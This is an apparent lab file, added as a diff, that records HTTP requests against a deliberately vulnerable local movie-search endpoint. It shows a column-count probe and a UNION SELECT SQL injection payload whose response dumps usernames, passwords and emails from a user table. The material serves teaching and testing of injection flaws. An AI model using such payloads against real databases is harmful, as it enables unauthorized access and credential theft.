@@ -1,0 +1,62 @@
+GET /sql-injection/union-attack/movie?title=The+Matrix
+HTTP/1.1
+Host: localhost:8080
+
+[
+    {
+        "id": 3,
+        "title": "The Matrix",
+        "director": "Lana Wachowski and Lilly Wachowski",
+        "year": 1999,
+        "genre": "Action, Sci-FI"
+    }
+]
+
+
+
+GET /sql-injection/union-attack/movie?title=The+Matrix'+ORDER+BY+6--
+HTTP/1.1
+Host: localhost:8080
+
+
+GET /sql-injection/union-attack/movie?title=The+Matrix'+UNION+select+id,username,password,0,email+from+sql_injection_user_info--
+HTTP/1.1
+Host: localhost:8080
+
+[
+    {
+        "id": 3,
+        "title": "The Matrix",
+        "director": "Lana Wachowski and Lilly Wachowski",
+        "year": 1999,
+        "genre": "Action, Sci-FI"
+    },
+    {
+        "id": 4,
+        "title": "Michelangelo",
+        "director": "mmmm44",
+        "year": 0,
+        "genre": "mike.@mail.co.uk"
+    },
+    {
+        "id": 2,
+        "title": "steeve",
+        "director": "st4444",
+        "year": 0,
+        "genre": "steve.clark@sss.ca"
+    },
+    {
+        "id": 1,
+        "title": "johnny",
+        "director": "jo1234",
+        "year": 0,
+        "genre": "john.doe@unknow.com"
+    },
+    {
+        "id": 3,
+        "title": "angelo",
+        "director": "angelo89",
+        "year": 0,
+        "genre": "angel@mail.ru"
+    }
+]
